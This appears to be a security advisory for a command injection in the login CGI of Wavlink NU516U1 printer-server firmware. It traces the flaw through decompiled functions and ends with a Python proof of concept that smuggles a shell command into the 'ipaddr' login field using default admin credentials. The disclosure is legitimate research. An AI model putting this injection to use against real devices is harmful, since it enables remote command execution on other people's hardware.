Vulnerability Overview

Wavlink is a company dedicated to network devices and communication solutions, offering high-quality routers, extenders, and network accessories. The firmware of its WAVLINK-NU516U1 model, which functions as a printer server network card, has a command injection vulnerability in its login interface, allowing attackers to execute authorized commands.

Details of the vulnerability

After unpacking the firmware, locate the login.cgi program. Open it in IDA under the main function. In the main (displayed as ftext in IDA) function, compare whether it is a normal login request. Normal login requests are handled by the function sub_4012A0.


<img width="994" height="651" alt="image" src="https://github.com/user-attachments/assets/40c49ea5-14a4-4f5d-8763-bf295a10baee" />

In the function sub_4012A0, the parameter value of ipaddr is retrieved and assigned to v9.

<img width="942" height="408" alt="image" src="https://github.com/user-attachments/assets/9b619bf6-afe7-4396-ae75-3c32a6868467" />

After the login verification is successful, obtain the parameter value of v9 and concatenate it to the parameter v31 used for system execution.

<img width="1341" height="342" alt="image" src="https://github.com/user-attachments/assets/334a86e9-70a3-4bcd-bdca-14808e9d7c82" />


poc

```
import requests

url = "http://192.168.1.2/cgi-bin/login.cgi"

headers = {
    "Host": "192.168.1.2",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://192.168.1.2",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://192.168.1.2/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close"
}

data = {
    "newUI": "1",
    "page": "login",
    "username": "admin",
    "langChange": "0",
    "ipaddr": "192.168.1.1$( echo 1 >/poc.txt)",
    "login_page": "login.shtml",
    "homepage": "main.shtml",
    "sysinitpage": "sysinit.shtml",
    "wizardpage": "wizard.shtml",
    "hostname": "192.168.1.2",
    "key": "M90920320",
    "lang_select": "en",
    "password": "admin",
    "password_vlaue": "7a72c504b83ee9da9d2d22eb83248670"
}
resp = requests.post(url, headers=headers, data=data)

print(resp.status_code)
print(resp.headers)
print(resp.text)
```



















